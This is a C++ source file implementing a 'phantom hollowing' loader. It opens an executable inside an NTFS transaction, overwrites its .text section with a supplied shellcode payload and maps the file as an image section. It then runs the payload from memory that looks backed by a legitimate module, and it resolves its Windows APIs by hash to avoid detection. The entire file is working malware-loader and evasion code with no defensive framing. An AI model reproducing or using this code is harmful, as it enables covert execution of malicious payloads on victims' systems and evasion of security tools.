#include "phantom.hpp"
#include <al/al.hpp>

unsigned long hollower::open_file_transaction(std::wstring_view path) noexcept {
    auto create_transaction = GP(m_ntdll, NtCreateTransaction, al::by_djb2);
    if (!create_transaction) {
        return ERROR_PROC_NOT_FOUND;
    }

    OBJECT_ATTRIBUTES attrs = { sizeof(OBJECT_ATTRIBUTES) };
    NTSTATUS status = create_transaction(
        &m_transaction,
        TRANSACTION_ALL_ACCESS,
        &attrs,
        nullptr,
        nullptr,
        0,
        0,
        0,
        nullptr,
        nullptr
    );
    if (NT_ERROR(status)) {
        return status;
    }

    auto create_file_transacted = GP(
        m_kernel32,
        CreateFileTransactedW,
        al::by_djb2
    );
    if (!create_file_transacted) {
        return ERROR_PROC_NOT_FOUND;
    }

    m_file = create_file_transacted(
        path.data(),
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr,
        m_transaction,
        nullptr,
        nullptr
    );
    if (INVALID_HANDLE_VALUE == m_file) {
        return NtCurrentTeb()->LastErrorValue;
    }
    return ERROR_SUCCESS;
}

unsigned long hollower::read_file() noexcept {
    auto get_file_size = GP(m_kernel32, GetFileSize, al::by_djb2);
    if (!get_file_size) {
        return ERROR_PROC_NOT_FOUND;
    }

    auto read_file = GP(m_kernel32, ReadFile, al::by_djb2);
    if (!read_file) {
        return ERROR_PROC_NOT_FOUND;
    }

    auto virtual_alloc = GP(m_kernel32, VirtualAlloc, al::by_djb2);
    if (!virtual_alloc) {
        return ERROR_PROC_NOT_FOUND;
    }

    // 4GB max without using high order dword
    m_buf_size = get_file_size(m_file, nullptr);

    m_buf = virtual_alloc(
        nullptr,
        m_buf_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!m_buf) {
        return NtCurrentTeb()->LastErrorValue;
    }

    unsigned long n;
    if (!read_file(m_file, m_buf, m_buf_size, &n, nullptr)) {
        return NtCurrentTeb()->LastErrorValue;
    }
    return ERROR_SUCCESS;
}

unsigned long hollower::write_file(std::span<uint8_t> pic) noexcept {
    auto write_file = GP(m_kernel32, WriteFile, al::by_djb2);
    if (!write_file) {
        return ERROR_PROC_NOT_FOUND;
    }

    auto set_file_pointer = GP(m_kernel32, SetFilePointer, al::by_djb2);
    if (!set_file_pointer) {
        return ERROR_PROC_NOT_FOUND;
    }

    m_va  = reinterpret_cast<uintptr_t>(m_buf);
    m_dos = static_cast<PIMAGE_DOS_HEADER>(m_buf);

    auto nt   = reinterpret_cast<PIMAGE_NT_HEADERS>(m_va + m_dos->e_lfanew);
    auto opt  = &nt->OptionalHeader;
    auto file = &nt->FileHeader;
    auto sec  = IMAGE_FIRST_SECTION(nt);

    bool found = false;
    for (unsigned short i = 0; i < file->NumberOfSections; ++i) {
        if (0 == strcmp(reinterpret_cast<char*>(sec->Name), ".text")) {
            found = true;
            break;
        }
        ++sec;
    }
    if (!found) {
        return ERROR_NOT_FOUND;
    }

    m_pic_offset = sec->VirtualAddress;

    memcpy(
        reinterpret_cast<void*>(m_va + sec->PointerToRawData),
        pic.data(),
        pic.size_bytes()
    );

    set_file_pointer(m_file, 0, nullptr, FILE_BEGIN);

    unsigned long n = 0;
    if (!write_file(m_file, m_buf, m_buf_size, &n, nullptr)) {
        return NtCurrentTeb()->LastErrorValue;
    }
    return ERROR_SUCCESS;
}

unsigned long hollower::map() noexcept {
    auto create_section = GP(m_ntdll, NtCreateSection, al::by_djb2);
    if (!create_section) {
        return ERROR_PROC_NOT_FOUND;
    }
    
    auto map_view_of_section = GP(m_ntdll, NtMapViewOfSection, al::by_djb2);
    if (!map_view_of_section) {
        return ERROR_PROC_NOT_FOUND;
    }

    auto virtual_protect = GP(m_kernel32, VirtualProtect, al::by_djb2);
    if (!virtual_protect) {
        return ERROR_PROC_NOT_FOUND;
    }

    NTSTATUS status = create_section(
        &m_section, 
        SECTION_ALL_ACCESS, 
        nullptr, 
        nullptr, 
        PAGE_READONLY, 
        SEC_IMAGE, 
        m_file
    );
    if (NT_ERROR(status)) {
        return status;
    }

    m_view = nullptr;
    size_t size = 0;
    status = map_view_of_section(
        m_section,
        reinterpret_cast<HANDLE>(-1),
        &m_view,
        0,
        0,
        nullptr,
        &size,
        ViewShare,
        0,
        PAGE_READONLY
    );
    if (NT_ERROR(status)) {
        return status;
    }

    return ERROR_SUCCESS;
}


hollower::hollower() noexcept {
    m_ntdll = GM(L"ntdll.dll", al::by_name);
    m_kernel32 = GM(L"KERNEL32.DLL", al::by_name);
}

hollower::~hollower() noexcept {
    if (INVALID_HANDLE_VALUE == m_file) {
        return;
    }

    if (!m_ntdll) {
        return;
    }

    auto nt_close = GP(m_ntdll, NtClose, al::by_djb2);
    if (!nt_close) {
        return;
    }
    
    nt_close(m_transaction);

    if (!m_kernel32) {
        return;
    }

    auto close_handle = GP(m_kernel32, CloseHandle, al::by_djb2);
    if (!close_handle) {
        return;
    }

    close_handle(m_file);
}

unsigned long hollower::phantom_hollow(std::wstring_view path, std::span<uint8_t> pic) noexcept {
    unsigned long err = open_file_transaction(path);
    if (ERROR_SUCCESS != err) {
        return err;
    }

    err = read_file();
    if (ERROR_SUCCESS != err) {
        return err;
    }

    err = write_file(pic);
    if (ERROR_SUCCESS != err) {
        return err;
    }

    err = map();
    if (ERROR_SUCCESS != err) {
        return err;
    }

    auto code_va = reinterpret_cast<uintptr_t>(m_view) + m_pic_offset;
    auto code = reinterpret_cast<pic_t>(code_va);
    code();
    return ERROR_SUCCESS;
}